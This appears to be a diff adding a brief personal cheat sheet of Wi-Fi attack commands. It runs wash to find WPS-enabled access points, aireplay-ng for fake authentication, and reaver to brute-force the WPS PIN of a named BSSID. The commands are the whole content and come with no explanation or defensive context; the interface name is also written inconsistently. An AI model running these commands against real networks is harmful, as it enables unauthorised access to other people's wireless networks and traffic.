@@ -1,0 +1,8 @@
+wash --interface wlan0mon
+# to search for wps enabled 
+
+#fake auth
+aireplay-ng --fakeauth 30 -a mac -h mac wlanmon0
+
+#brute force
+└─# reaver --bssid E4:CA:12:3E:97:90 --channel 1 --interface wlan0mon -vvv --no-associate
